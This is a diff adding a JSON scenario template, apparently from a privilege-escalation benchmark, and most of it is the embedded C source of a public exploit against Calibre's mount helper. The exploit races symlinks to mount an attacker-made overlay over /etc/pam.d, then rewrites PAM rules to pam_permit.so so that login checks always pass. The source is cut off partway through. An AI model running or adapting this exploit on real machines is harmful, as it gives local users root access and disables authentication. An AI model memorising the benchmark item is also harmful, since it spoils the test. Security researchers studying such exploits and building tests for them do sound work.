@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_18086",
+  "category": "B1_ld_preload",
+  "attack_technique": "T1574.006",
+  "cwe": "CWE-427",
+  "description": "Linux privilege escalation: Calibre E-Book Reader - Local Privilege Escalation (3) (OSVDB-76830;OSVDB-76829)\n\nExploit source code (18086.c):\n```\n/*\n * ########################################################\n * #               .80 Calibrer Assault Mount             #\n * #                         by zx2c4                     #\n * ########################################################\n *\n * Yesterday's assult mount used inotify to mount into /etc/pam.d. Today we\n * expand the attack by adding a race toggler so we can mount from non-block\n * devices.\n *\n * Enjoy.\n *\n * - zx2c4\n * 2011-11-4\n *\n * greets to djrbliss\n *\n */\n\n\n#include <stdio.h>\n#include <sys/inotify.h>\n#include <unistd.h>\n#include <stdlib.h>\n#include <signal.h>\n\nint main(int argc, char **argv)\n{\n\tprintf(\"########################################################\\n\");\n\tprintf(\"#               .80 Calibrer Assault Mount             #\\n\");\n\tprintf(\"#                         by zx2c4                     #\\n\");\n \tprintf(\"########################################################\\n\\n\");\n\n\n\tprintf(\"[+] Cleaning up old cruft.\\n\");\n\tunlink(\"/dev/shm/overlay\");\n\tsystem(\"calibre-mount-helper cleanup /dev/ram0 /media/staging/\");\n\n\tprintf(\"[+] Creating overlay container.\\n\");\n\tsystem(\"dd if=/dev/zero of=/dev/shm/overlay count=25600\");\n\tsystem(\"/usr/sbin/mkfs.ntfs /dev/shm/overlay\");\n\n\tprintf(\"[+] Mounting staging using race condition toggler...\\n\");\n\tint childpid = fork();\n\tif (childpid) {\n\t\tint ret;\n\t\twhile ((ret = system(\"calibre-mount-helper mount /dev/shm/overlay /media/staging/ 2>&1\")) == 256 || ret == 8192);\n\t\tkill(childpid, SIGKILL);\n\t} else {\n\t\twhile (1) {\n\t\t\trename(\"/dev/shm/overlay\", \"/dev/shm/overlay-holder\");\n\t\t\tsymlink(\"/dev/ram0\", \"/dev/shm/overlay\");\n\t\t\tunlink(\"/dev/shm/overlay\");\n\t\t\trename(\"/dev/shm/overlay-holder\", \"/dev/shm/overlay\");\n\t\t}\n\t\treturn 0;\n\t}\n\n\tprintf(\"[+] Preparing overlay with /etc/pam.d modification:\\n\");\n\tsystem(\"cp -v /etc/pam.d/* /media/staging/\");\n\tsystem(\"sed -i \\\"s/pam_deny.so/pam_permit.so/g\\\" /media/staging/common-auth\");\n\tsystem(\"sed -i \\\"s/pam_cracklib.so.*/pam_permit.so/g\\\" /media/staging/system-auth\");\n\tsystem(\"sed -i \\\"s/pam_unix.so.*/pam_permit.so/g\\\" /media/staging/system-auth\");\n\n\n\tprintf(\"[+] Mounting overlay over /etc/pam.d using race condition toggler and inotify...\\n\");\n\tchildpid = fork();\n\tif (childpid) {\n\t\tint childpid2 = fork();\n\t\tif (childpid2) {\n\t\t\tint ret;\n\t\t\twhile ((ret = system(\"calibre-mount-helper mount /dev/shm/overlay /etc/pam.d/ 2>&1\")) == 256 || ret == 8192);\n\t\t\tkill(childpid, SIGKILL);\n\t\t\tkill(childpid2, SIGKILL);\n\t\t} else {\n\t\t\twhile (1) {\n\t\t\t\tint fd;\n\t\t\t\tfd = inotify_init();\n\t\t\t\tunlink(\"/media/staging/fake\");\n\t\t\t\tmkdir(\"/media/staging/fake\");\n\t\t\t\tinotify_add_watch(fd, \"/media/staging/fake\", IN_CREATE);\n\t\t\t\tread(fd, 0, 0);\n\t\t\t\trename(\"/media/staging/fake\", \"/media/staging/tmp\");\n\t\t\t\tsymlink(\"/etc/pam.d\", \"/media/staging/fake\");\n\t\t\t\trmdir(\"/media/staging/tmp\");\n\t\t\t\tclose(fd);\n\t\t\t}\n\t\t}\n\t} else {\n\t\twhile (1) {\n\t\t\trename(\"/dev/shm/overlay\", \"/dev/shm/overlay-holder\");\n\t\t\tsymlink(\"/dev/ram0\", \"/dev/shm/overlay\");\n\t\t\tunlink(\"/dev/shm/overlay\");\n\t\t\trename(\"/dev/shm/overlay-holder\", \"\n```",
+  "cve": "OSVDB-76830;OSVDB-76829",
+  "exploitdb_id": "18086",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_18086",
+      "type": "core",
+      "difficulty": "hard"
+    }
+  ]
+}
